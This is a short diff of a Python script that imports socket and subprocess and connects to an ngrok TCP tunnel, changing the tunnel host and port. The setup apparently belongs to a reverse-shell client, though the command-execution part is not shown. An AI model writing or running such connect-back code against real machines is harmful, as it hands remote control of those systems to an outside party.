@@ -3,8 +3,8 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '0.tcp.ap.ngrok.io' # this may change on your system, check and update it .
-port = 14561
+host = '5.tcp.eu.ngrok.io' # this may change on your system, check and update it .
+port = 15779 
 
 s.connect((host,port))
 
